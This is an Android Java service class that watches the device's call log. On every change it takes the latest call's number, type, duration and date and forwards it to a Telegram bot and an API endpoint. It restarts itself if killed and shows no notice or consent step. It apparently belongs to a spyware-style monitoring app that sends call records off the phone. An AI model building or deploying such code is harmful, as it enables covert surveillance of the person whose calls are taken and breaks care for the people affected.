package com.example.control;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.util.Log;

import androidx.annotation.Nullable;

/**
 * Service component that specifically monitors call logs
 * Can be used by MonitoringService to handle call-specific monitoring
 */
public class CallMonitoringService extends Service {
    private static final String TAG = "CallMonitoringService";
    
    private Context context;
    private TelegramBotIntegration telegramBot;
    private ApiService apiService;
    private CallLogObserver callLogObserver;
    
    @Override
    public void onCreate() {
        super.onCreate();
        this.context = getApplicationContext();
        this.telegramBot = new TelegramBotIntegration(context);
        this.apiService = ApiService.getInstance(context);
        
        startMonitoring();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Call monitoring service started");
        // If service is killed by the system, restart it
        return START_STICKY;
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        stopMonitoring();
        Log.d(TAG, "Call monitoring service destroyed");
    }
    
    /**
     * Start monitoring for call log changes
     */
    public void startMonitoring() {
        callLogObserver = new CallLogObserver(new Handler());
        context.getContentResolver().registerContentObserver(
                CallLog.Calls.CONTENT_URI, 
                true, 
                callLogObserver);
        
        Log.d(TAG, "Call log monitoring started");
    }
    
    /**
     * Stop monitoring call logs
     */
    public void stopMonitoring() {
        if (callLogObserver != null) {
            context.getContentResolver().unregisterContentObserver(callLogObserver);
            callLogObserver = null;
            Log.d(TAG, "Call log monitoring stopped");
        }
    }
    
    /**
     * Get the last call from the call log
     * @return Details of the last call or null if no calls found
     */
    public String getLastCallDetails() {
        String[] projection = new String[] {
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
        };
        
        String sortOrder = CallLog.Calls.DATE + " DESC";
        String callDetails = null;
        
        try (Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                sortOrder)) {
            
            if (cursor != null && cursor.moveToFirst()) {
                String number = cursor.getString(0);
                int type = cursor.getInt(1);
                long date = cursor.getLong(2);
                int duration = cursor.getInt(3);
                
                String callType;
                switch (type) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        callType = "OUTGOING";
                        break;
                    case CallLog.Calls.INCOMING_TYPE:
                        callType = "INCOMING";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        callType = "MISSED";
                        break;
                    default:
                        callType = "UNKNOWN";
                        break;
                }
                
                callDetails = "Call Type: " + callType + 
                        ", Number: " + number + 
                        ", Duration: " + duration + "s" +
                        ", Date: " + new java.util.Date(date).toString();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error accessing call log: " + e.getMessage());
        }
        
        return callDetails;
    }
    
    /**
     * Content observer for call log changes
     */
    private class CallLogObserver extends ContentObserver {
        
        public CallLogObserver(Handler handler) {
            super(handler);
        }
        
        @Override
        public void onChange(boolean selfChange) {
            this.onChange(selfChange, null);
        }
        
        @Override
        public void onChange(boolean selfChange, Uri uri) {
            Log.d(TAG, "Call log change detected");
            
            String callDetails = getLastCallDetails();
            if (callDetails != null) {
                // Send to both Telegram and API
                telegramBot.sendMessage(callDetails);
                apiService.sendEventData("call_log", callDetails);
            }
        }
    }
}
